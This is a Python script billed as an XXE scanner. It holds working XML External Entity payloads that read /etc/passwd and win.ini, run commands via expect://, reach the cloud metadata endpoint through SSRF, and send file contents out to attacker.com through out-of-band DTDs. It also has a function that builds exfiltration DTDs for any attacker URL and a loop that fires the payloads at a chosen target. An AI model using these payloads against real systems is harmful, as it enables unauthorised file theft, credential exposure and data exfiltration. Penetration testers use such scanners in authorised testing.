#!/usr/bin/env python3
"""
XXE Scanner
XML External Entity vulnerability scanner
"""

import requests
import argparse
import base64
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# XXE payloads
XXE_PAYLOADS = {
    "basic": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>""",

    "error_based": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>""",

    "blind_ooo": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe; ]>
<foo></foo>""",

    "file_linux": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>""",

    "file_windows": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini"> ]>
<foo>&xxe;</foo>""",

    "php_filter": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<foo>&xxe;</foo>""",

    "expect": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<foo>&xxe;</foo>""",

    "ssrf": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>""",

    "ssrf_internal": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:80/"> ]>
<foo>&xxe;</foo>""",

    "ftp": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "ftp://attacker.com/file.txt"> ]>
<foo>&xxe;</foo>""",

    "nested": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo></foo>""",
}

# DTD for OOB XXE
OOB_DTD = """<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
"""

# Signatures that indicate XXE success
XXE_SIGNATURES = {
    "passwd": ["root:x:", "daemon:x:", "bin:x:", "sys:x:"],
    "win_ini": ["[windows]", "[fonts]", "[extensions]"],
    "phpinfo": ["phpinfo()", "PHP Version"],
    "error": ["DOCTYPE", "ENTITY", "xmlParseEntityDecl"],
}


def test_xxe(url, payload, method="POST", content_type="application/xml"):
    """Test for XXE vulnerability"""
    try:
        headers = {
            "Content-Type": content_type,
        }
        
        if method.upper() == "POST":
            response = requests.post(url, data=payload, headers=headers, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        
        content = response.text
        
        # Check for file content
        for file_type, signatures in XXE_SIGNATURES.items():
            for sig in signatures:
                if sig in content:
                    return True, f"Found {file_type} content: {sig[:50]}"
        
        # Check for base64 encoded content (php filter)
        if "PD9waHA" in content or "cm9vdDo" in content:
            return True, "Base64 encoded content detected (php://filter)"
        
        # Check for error messages that indicate XXE processing
        if "xml" in content.lower() and ("entity" in content.lower() or "doctype" in content.lower()):
            return True, "XML processing error (XXE might be possible)"
        
        return False, None
    except Exception as e:
        return False, str(e)


def scan_xxe(url):
    """Scan for XXE vulnerabilities"""
    print(f"[*] Scanning: {url}\n")
    
    vulnerabilities = []
    
    # Test different payload types
    tests = [
        ("Basic XXE", XXE_PAYLOADS["basic"]),
        ("Linux File Read", XXE_PAYLOADS["file_linux"]),
        ("Windows File Read", XXE_PAYLOADS["file_windows"]),
        ("PHP Filter", XXE_PAYLOADS["php_filter"]),
        ("SSRF", XXE_PAYLOADS["ssrf"]),
    ]
    
    for test_name, payload in tests:
        print(f"[*] Testing: {test_name}")
        
        # Test with application/xml
        is_vuln, message = test_xxe(url, payload, content_type="application/xml")
        if is_vuln:
            print(f"[+] XXE found!")
            print(f"    Type: {test_name}")
            print(f"    Content-Type: application/xml")
            print(f"    Details: {message}")
            vulnerabilities.append({
                "type": test_name,
                "content_type": "application/xml",
                "payload": payload[:100] + "...",
                "message": message
            })
            continue
        
        # Test with text/xml
        is_vuln, message = test_xxe(url, payload, content_type="text/xml")
        if is_vuln:
            print(f"[+] XXE found!")
            print(f"    Type: {test_name}")
            print(f"    Content-Type: text/xml")
            print(f"    Details: {message}")
            vulnerabilities.append({
                "type": test_name,
                "content_type": "text/xml",
                "payload": payload[:100] + "...",
                "message": message
            })
    
    return vulnerabilities


def generate_oob_dtd(attacker_url, target_file="/etc/passwd"):
    """Generate OOB XXE DTD"""
    dtd = f"""<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{attacker_url}/?x=%file;'>">
%eval;
%exfiltrate;
"""
    return dtd


def main():
    parser = argparse.ArgumentParser(description="XXE Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="POST", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--oob", help="Attacker URL for OOB XXE (e.g., http://attacker.com)")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_xxe(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} XXE vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Type: {vuln['type']}")
            print(f"     Content-Type: {vuln['content_type']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[-] No XXE vulnerabilities detected")
        print("[*] Try manual testing with custom XML endpoints")
    
    if args.oob:
        print("\n[*] OOB XXE DTD:")
        print(generate_oob_dtd(args.oob))
    
    if args.output and vulnerabilities:
        with open(args.output, 'w') as f:
            for vuln in vulnerabilities:
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"Content-Type: {vuln['content_type']}\n")
                f.write(f"Details: {vuln['message']}\n\n")
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
